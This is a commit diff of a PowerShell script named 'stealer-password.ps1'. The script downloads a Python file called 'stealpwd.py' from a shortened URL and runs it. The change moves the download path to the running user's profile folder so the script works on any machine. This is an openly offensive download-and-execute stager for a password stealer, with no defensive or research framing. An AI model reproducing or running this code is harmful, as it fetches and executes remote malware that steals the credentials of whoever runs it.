86875121c5f3c6b1c2b3e5c1227ff5684e6ff8dc
xborz75 <103429301+xborz75@users.noreply.github.com>
2024-05-11 18:20:09 +0200

    Update stealer-password.ps1

--- stealer-password.ps1
+++ stealer-password.ps1
@@ -1,3 +1,3 @@
 $WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile("https://rebrand.ly/iab05iw", "C:\Users\admin\stealpwd.py")
-python3 "C:\Users\admin\stealpwd.py"
+$WebClient.DownloadFile("https://rebrand.ly/iab05iw", "$env:USERPROFILE\stealpwd.py")
+python3 "$env:USERPROFILE\stealpwd.py"
